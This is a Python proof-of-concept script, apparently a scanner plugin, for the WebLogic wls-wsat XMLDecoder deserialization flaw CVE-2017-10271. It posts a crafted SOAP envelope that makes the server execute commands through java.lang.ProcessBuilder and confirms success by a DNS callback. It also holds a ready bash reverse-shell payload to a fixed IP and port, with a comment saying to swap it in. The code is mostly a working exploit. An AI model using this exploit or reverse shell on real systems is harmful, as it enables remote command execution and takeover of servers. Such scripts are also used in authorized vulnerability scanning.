#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

"""
Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）

Desc
    Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，
    在解析的过程中出现反序列化漏洞，导致可执行任意命令。
Version
    10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
Type
    报错回显命令执行
Referer
    - https://www.exploit-db.com/exploits/43458/
    - https://paper.seebug.org/487/
    - https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md
    - http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html
"""
import requests
import logging
from plugin.dnslog import Dnslog

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    mydnslog = Dnslog("weblogic-wls-xml")
    cmd = mydnslog.getCommand("dns")
    exec_cmd = '<array class="java.lang.String" length="{0}">'.format(len(cmd.split()))
    for i, c in enumerate(cmd.split()):
        exec_cmd += '<void index="{0}"><string>{1}</string></void>'.format(i, c)
    exec_cmd += '</array>'
    reverse_shell_cmd = '''
    <array class="java.lang.String" length="3">
        <void index="0">
        <string>/bin/bash</string>
        </void>
        <void index="1">
        <string>-c</string>
        </void>
        <void index="2">
        <string>bash -i &gt;&amp; /dev/tcp/192.168.1.137/2000 0&gt;&amp;1</string>
        </void>
    </array>
    '''
    payload_data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
                {}
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    vulurl = url + "/wls-wsat/CoordinatorPortType"
    try:
        headers = {'Content-Type': 'text/xml;charset=UTF-8'}
        data = payload_data.format(exec_cmd) # 替换成reverse_shell_data就是反弹shell
        resp = requests.post(vulurl, data=data, headers=headers, timeout=10)
        if mydnslog.verifyDNS(3):
            return "[weblogc-wls-xmldecoder][dnslog]" + url
        if '<faultstring>java.lang.ProcessBuilder' in resp.text or "<faultstring>0" in resp.text:
            return True
    except Exception as e:
        logging.debug(e)
    return False

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    print poc("192.168.1.139:7001")
